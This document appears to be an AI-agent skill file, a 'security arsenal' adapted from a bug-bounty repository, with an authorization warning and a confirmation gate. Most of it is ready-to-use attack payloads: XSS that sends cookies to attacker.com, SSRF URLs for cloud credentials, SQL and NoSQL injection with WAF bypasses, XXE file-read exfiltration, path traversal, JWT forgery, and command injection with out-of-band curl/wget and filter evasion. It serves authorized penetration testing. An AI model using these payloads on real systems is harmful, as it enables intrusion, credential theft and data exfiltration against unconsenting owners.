---
name: security-arsenal
description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected
  bug list, and conditionally-valid-with-chain table.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: community, public_research
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# SECURITY ARSENAL

Payloads, bypass tables, wordlists, and submission rules.

---

## XSS PAYLOADS

### Basic Probes
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie Theft (proof of impact)
```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP Bypass Techniques
```javascript
// If unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// If script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

// Angular template injection (bypasses many CSPs)
{{constructor.constructor('alert(1)')()}}

// React dangerouslySetInnerHTML reflection
// Vue v-html binding

// mXSS (mutation-based XSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot (works in HTML/JS/CSS context)
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

### DOM XSS Sources and Sinks
```javascript
// Sources (user-controlled input)
location.hash
location.search
location.href
document.referrer
window.name
document.URL

// Sinks (dangerous)
innerHTML = SOURCE
outerHTML = SOURCE
document.write(SOURCE)
eval(SOURCE) <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
setTimeout(SOURCE, ...)   // string form
setInterval(SOURCE, ...)
new Function(SOURCE)
element.src = SOURCE      // javascript: URI
element.href = SOURCE
location.href = SOURCE
```

---

## SSRF PAYLOADS

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379      # Redis (unauthenticated, RESP protocol)
http://localhost:9200      # Elasticsearch (/_cat/indices)
http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
http://localhost:8080      # Admin panel
http://localhost:2375      # Docker API — GET /containers/json
http://localhost:10.96.0.1:443  # Kubernetes API server
```

### SSRF IP Bypass Payloads
```bash
# All of these map to 127.0.0.1:
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:0x7f000001] # mixed hex IPv6

# DNS rebinding: A→external, then resolves to internal after allowlist check

# Redirect chain (Vercel pattern):
# If filter only checks initial URL but follows redirects:
http://allowed-domain.com/redirect?to=http://169.254.169.254/
```

---

## SQL INJECTION PAYLOADS

### Detection
```sql
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
'; SELECT SLEEP(5)--          -- MySQL time-based
' OR SLEEP(5)--
```

### Union-Based (determine column count)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### Blind SQLi (time-based confirmation)
```sql
# MySQL
' AND SLEEP(5)--
# PostgreSQL
' AND pg_sleep(5)--
# MSSQL
'; WAITFOR DELAY '0:0:5'--
# Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### WAF Bypass
```sql
/*!50000 SELECT*/ * FROM users     -- MySQL inline comment
SE/**/LECT * FROM users             -- comment injection
SeLeCt * FrOm uSeRs                -- case variation
%27 OR %271%27=%271                 -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                       -- Unicode apostrophe
```

---

## XXE PAYLOADS

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB via HTTP (DNS confirmation)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### Blind OOB via DNS + Data Exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

### XXE via DOCX/SVG/PDF Upload
- SVG: `<image href="file:///etc/passwd" />`
- DOCX: malicious XML in `word/document.xml` with external entity

---

## PATH TRAVERSAL PAYLOADS

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
/etc/passwd%00.jpg                     # null byte truncation
....\/....\/etc/passwd                 # mix of separators
```

---

## IDOR / AUTH BYPASS PAYLOADS

### Horizontal Privilege Escalation
```bash
# Change numeric ID
GET /api/user/123/profile → GET /api/user/124/profile

# Change UUID (find victim UUID via other endpoints)
GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...

# HTTP method swap
PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)

# Old API version
GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)

# Add parameter
GET /api/orders → GET /api/orders?user_id=456
```

### Vertical Privilege Escalation
```bash
# Parameter pollution
POST /api/user/update
{"role": "admin"}
{"isAdmin": true}
{"admin": 1}

# Hidden fields
<input type="hidden" name="admin" value="true">
# Change in Burp before sending

# GraphQL introspection → find admin mutations
{"query": "{ __schema { types { name fields { name } } } }"}
```

---

## AUTHENTICATION BYPASS PAYLOADS

### JWT Attacks
```bash
# None algorithm
# Decode JWT, change alg to "none", remove signature
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

### OAuth Attacks
```bash
# Missing PKCE test
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# No code_challenge → check if 302 (not error) = PKCE not enforced

# State parameter check
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# Missing/static state parameter = CSRF on OAuth = account linkage attack
```

---

## NOSQL INJECTION PAYLOADS (MongoDB)

### Operator Injection (JSON body)
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
{"username": {"$in": ["admin", "root", "administrator"]}}
```

### GET Parameter Injection
```bash
# URL parameter injection
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
/login?username=admin&password[$gt]=

# MongoDB operator reference:
# $ne = not equal (bypass: value != null = any value matches)
# $gt = greater than (bypass: "" < any string)
# $regex = regex match (bypass: .* = anything)
# $where = JS expression (RCE potential on older MongoDB)
```

### Auth Bypass One-Liners
```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL-encoded for GET forms:
# username%5B%24ne%5D=null&password%5B%24ne%5D=null
```

---

## COMMAND INJECTION PAYLOADS

### Basic Detection
```bash
; id
| id
` id `
$(id)
&& id
|| id
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

### Blind OOB (out-of-band confirmation)
```bash
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
`ping -c 1 attacker.burpcollaborator.net`
; wget https://attacker.com/$(id|base64)
```

### Bypass Techniques
```bash
# Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd

# Bypass keyword filter (cat, id blocked)
# Obfuscate with quotes
;c'a't /etc/passwd
;c"a"t /etc/passwd
;$(printf '\x63\x61\x74') /etc/passwd

# Bypass via env
;$BASH -c 'id'
;${IFS}id

# Windows-specific
& dir
| type C:\Windows\win.ini
& ping -n 1 attacker.com
```

### Context-Specific (filename injection)
```bash
# File upload filenames
test.jpg; id
test$(id).jpg
test`id`.jpg
../test.jpg
../../../../../../etc/passwd
```

---


## Contents

- [SSTI DETECTION PAYLOADS (All Engines)](references/details.md)
- [HTTP SMUGGLING PAYLOADS](references/details.md)
- [WEBSOCKET PAYLOADS](references/details.md)
- [MFA / 2FA BYPASS PAYLOADS](references/details.md)
- [SAML ATTACKS](references/details.md)
- [GF PATTERN NAMES (tomnomnom/gf)](references/details.md)
- [ALWAYS REJECTED — NEVER SUBMIT](references/details.md)
- [CONDITIONALLY VALID — REQUIRES CHAIN](references/details.md)
- [WORDLISTS (Installed in ~/wordlists/)](references/details.md)
- [Related Skills & Chains](references/details.md)
- [Operator Notes (Claude-BugHunter)](references/details.md)

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
